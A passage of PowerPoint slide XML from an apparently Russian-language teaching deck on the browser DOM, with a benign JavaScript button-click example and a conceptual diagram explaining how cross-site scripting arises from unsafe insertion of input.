              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9960E2FA-4072-45CA-8D1F-1ACCD856D194}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6894904" y="3228714"/>
            <a:ext cx="1802037" cy="335560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6500"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19526">
            <a:solidFill>
              <a:srgbClr val="8D9BA5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6000"/>
              </a:lnSpc>
              <a:buNone/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725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html</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="v17-node-head">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6A75ED93-0930-4011-B1F2-7E6C8CE95B43}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5289564" y="3800826"/>
            <a:ext cx="1657874" cy="335560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6500"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19526">
            <a:solidFill>
              <a:srgbClr val="8D9BA5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6000"/>
              </a:lnSpc>
              <a:buNone/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725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head</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="v17-node-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{89AF4BB7-54BA-4AAB-8BC0-F910C47913F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8696941" y="3800826"/>
            <a:ext cx="1657874" cy="335560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6500"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19526">
            <a:solidFill>
              <a:srgbClr val="8D9BA5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6000"/>
              </a:lnSpc>
              <a:buNone/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body</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="v17-node-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F6939E8B-C7EE-495E-84BC-1005D994E300}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5289564" y="4515201"/>
            <a:ext cx="1657874" cy="335560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6500"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19526">
            <a:solidFill>
              <a:srgbClr val="8D9BA5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6000"/>
              </a:lnSpc>
              <a:buNone/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title</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="v17-node-main">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD8BDDDA-B612-423E-8B68-C535A9481142}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8696941" y="4515201"/>
            <a:ext cx="1657874" cy="335560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6500"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19526">
            <a:solidFill>
              <a:srgbClr val="8D9BA5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6000"/>
              </a:lnSpc>
              <a:buNone/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main</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="v17-node-form">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1F5AD61F-B586-4ED5-AB2E-38DCF9384B54}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7695522" y="5371839"/>
            <a:ext cx="1477670" cy="335560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6500"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19526">
            <a:solidFill>
              <a:srgbClr val="8D9BA5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6000"/>
              </a:lnSpc>
              <a:buNone/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form</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="v17-node-article">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DB990BD3-E838-480A-A609-F6C190FD7584}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9912027" y="5371839"/>
            <a:ext cx="1477670" cy="335560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6500"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19526">
            <a:solidFill>
              <a:srgbClr val="8D9BA5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6000"/>
              </a:lnSpc>
              <a:buNone/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article</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="v17-node-input">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2D18A48B-B7A9-475D-AC78-57A80FD52232}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6318252" y="6086214"/>
            <a:ext cx="1477670" cy="335560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6500"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19526">
            <a:solidFill>
              <a:srgbClr val="8D9BA5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6000"/>
              </a:lnSpc>
              <a:buNone/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input</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="v17-node-button">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FC22E05E-BC25-4074-A2AC-28F0F0B9132D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8980117" y="6086214"/>
            <a:ext cx="1477670" cy="335560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6500"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19526">
            <a:solidFill>
              <a:srgbClr val="8D9BA5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6000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:def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button</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3408209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1A3BAE96-1EBC-4E41-8B06-21E1C02ED580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DOM: как работает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91AC8875-EFC7-48AC-9E04-D9FFD800E1E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JavaScript находит элементы DOM и меняет их содержимое без перезагрузки страницы.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="html-heading">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A6561D82-8D49-437D-A582-420CC1B26396}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2466975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HTML</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="html">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ED16E8F8-B177-4EAD-AEFB-9F713A0ED4DD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68008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80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80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80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80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"status"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="180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8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Ожидание</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="180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180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80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 algn="l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80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button</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="180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80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80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"start"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="180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8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Начать</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="180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180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button</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="180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5" name="js-heading">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BCC5F4BD-9632-4AB4-9BBB-D500A7B4E0E4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JavaScript</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="javascript">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E78F668B-E332-41C8-B633-EF04D568FDF1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685800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button = document.</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1725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querySelector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"#start"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status = document.</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1725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querySelector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"#status"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button.</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1725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addEventListener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"click"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() =&gt; {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status.textContent = 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"Готово"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});</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="page-heading">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AC594F01-0494-4E91-AF04-BF45A019EE99}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8172450" y="2466975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Элемент на странице</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="process-node-before">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E6EBC0F8-5A28-41AF-BAA9-5C023E375236}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8172450" y="2952750"/>
            <a:ext cx="3333750" cy="108585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8D9B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before-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1DC3AC06-49C7-4701-9478-744F494A03B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8305800" y="3124200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#status</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="before-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{21A85508-3723-45A1-A23B-53B1850486D5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8324850" y="3552825"/>
            <a:ext cx="302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Ожидание</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="11" name="flow-click">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{12E23BA3-799F-4CD9-835E-271FA3B5FB6E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9839325" y="4038600"/>
            <a:ext cx="0" cy="1000125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2" name="flow-label-click">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7CC0AD0-441C-4451-80CF-44E83AA79E06}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8172450" y="4276725"/>
            <a:ext cx="152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Нажатие</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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«Начать»</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="process-node-after">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4AA63374-02A0-4E2C-A8B7-5BE04C04B83A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8172450" y="5038725"/>
            <a:ext cx="3333750" cy="108585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8D9B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after-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6E1B51D4-A17D-4D76-94FF-6D8B6422EA10}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8305800" y="5210175"/>
            <a:ext cx="3067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#status</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="after-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5A3BD19F-52D2-44D8-BAD6-00AC30C1BEB1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8324850" y="5638800"/>
            <a:ext cx="302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Готово</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Рисунок 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D796F08A-6F0B-415C-B3ED-958297DCB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9153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>
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{866245EC-2856-447D-A313-B80F94D11CD5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XSS: выполнение JavaScript в браузере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1A7BA17E-A17F-4AB6-BD4B-571B61BAA70C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Cross-Site Scripting - выполнение внедрённого JavaScript в контексте страницы уязвимого сайта.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="process-node-input">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{358DA157-A7B2-44FD-B0C7-1B3C4870B9DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2771775"/>
            <a:ext cx="2857500" cy="257175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input-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5F439C15-4D3E-4016-B814-AF71FD10CFFC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="3590925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Источник</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="input-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CBB37336-02A2-495A-9DF4-95988D984743}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="4076700"/>
            <a:ext cx="2552700" cy="1171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Ввод пользователя,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ссылка или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ответ API</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="process-node-page">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2C9D6340-84BF-47CC-BDED-C29AE468980E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4667250" y="2771775"/>
            <a:ext cx="2857500" cy="257175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page-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FDD903E6-5724-4849-AF58-A0774DA46FCE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4781550" y="3590925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Код страницы</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="page-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B6B0D458-BECA-454B-B89A-1FE6EBF1FB5A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4819650" y="4076700"/>
            <a:ext cx="2552700" cy="1171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Небезопасно</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr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вставляет или</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr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обрабатывает значение</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="process-node-browser">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{92F3BBF2-6221-4C72-BD2B-07A2D3247537}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8648700" y="2771775"/>
            <a:ext cx="2857500" cy="257175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browser-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EFE71C08-6901-4EEC-8C62-0CFB68ABC399}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8763000" y="3590925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Браузер</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="browser-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C93A7F53-BF1E-4F75-BEC5-3D31685B44F5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8801100" y="4076700"/>
            <a:ext cx="2552700" cy="1171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Считает часть ввода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разметкой или кодом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Выполняет JavaScript</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="12" name="flow-input">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E30F5B5D-86C3-45C9-8AD7-3F6BCDDD0DD3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3543300" y="3810000"/>
            <a:ext cx="1123950" cy="0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3" name="flow-label-input">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{492F5A3F-F1CA-41FE-99E0-315137A6F5CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3600450" y="3352800"/>
            <a:ext cx="1009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Данные</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="flow-execution">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2514D960-0FD8-42F9-852C-63A1E2F26429}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7524750" y="3810000"/>
            <a:ext cx="1123950" cy="0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5" name="flow-label-execution">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C09DFAD8-EEAD-4884-9C4C-10035C19D945}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7581900" y="3209925"/>
            <a:ext cx="1009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Опасная</a:t>
            </a:r>
          </a:p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вставка</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="component-laptop-19">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F38D8F23-0D11-4579-A8A3-7C43522D03A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1928812" y="2962275"/>
            <a:ext cx="371475" cy="278606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component-laptop-20">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60554608-60AF-4C8B-B1EF-95E101FCFE9D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1866900" y="3240881"/>
            <a:ext cx="495300" cy="108347"/>
          </a:xfrm>
          <a:prstGeom prst="trapezoid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component-laptop-21">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F38D8F23-0D11-4579-A8A3-7C43522D03A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5910262" y="2962275"/>
            <a:ext cx="371475" cy="278606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component-laptop-22">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
